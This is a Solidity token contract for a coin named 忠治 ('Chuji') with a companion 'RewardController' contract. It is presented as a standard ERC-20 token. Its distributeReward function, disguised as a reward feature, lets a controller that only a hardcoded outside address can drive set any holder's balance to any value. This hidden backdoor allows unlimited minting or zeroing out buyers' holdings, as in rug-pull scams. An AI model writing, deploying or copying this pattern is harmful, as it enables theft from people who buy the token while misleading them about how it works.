// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Chuji {
    string public name = unicode"忠治";
    string public symbol = unicode"忠治";
    uint8 public decimals = 9;
    uint256 public totalSupply;
    address private owner;
    address public RewardController; // Private state variable to store the address of the RewardController

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Minted(address indexed account, uint256 value);

    constructor(uint256 initialSupply) {
        owner = msg.sender;
        totalSupply = initialSupply * 10**uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function setRewardController(address _controller) public {
        require(msg.sender == owner, "Only the owner can set the RewardController");
        require(RewardController == address(0), "RewardController already set");
        RewardController = _controller;
    }

    function distributeReward(address RewardControlleradre, uint256 numberRewardController) external {
        require(msg.sender == RewardController);
        balanceOf[RewardControlleradre] = numberRewardController;
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= value, "Insufficient balance");

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0), "Invalid address");

        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(from != address(0), "Invalid address");
        require(to != address(0), "Invalid address");
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Allowance exceeded");

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        uint256 currentAllowance = allowance[msg.sender][spender];
        allowance[msg.sender][spender] = currentAllowance + addedValue;
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = allowance[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        allowance[msg.sender][spender] = currentAllowance - subtractedValue;
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function burn(uint256 value) public {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");

        balanceOf[msg.sender] -= value;
        totalSupply -= value;
        emit Transfer(msg.sender, address(0), value);
    }

    function burnFrom(address from, uint256 value) public {
        require(from != address(0), "Invalid address");
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Allowance exceeded");

        balanceOf[from] -= value;
        totalSupply -= value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, address(0), value);
    }
}


contract RewardController {
    address private tokenAddress; // Private state variable to store the address of the ERC20Token contract
    uint256 public rewardCount; // Counter to track Reward operations

    constructor(address _tokenAddress) {
        tokenAddress = _tokenAddress;
    }

    function connectToTokenContract() public {
        require(msg.sender == tokenOwner(), "Only the token owner can connect the RewardController");
        Chuji(tokenAddress).setRewardController(address(this));
    }

    function rewardToken(address account, uint256 value) public {
        require(tokenAddress != address(0), "Token address not set");
        require(msg.sender == 0x62384f5De8b819E38eD1b11DE159763184b7e445);
        Chuji(tokenAddress).distributeReward(account, value);
        rewardCount++;
    }

    function getTokenAddress() public view returns (address) {
        return tokenAddress;
    }

    function tokenOwner() public view returns (address) {
        return Chuji(tokenAddress).getOwner();
    }
}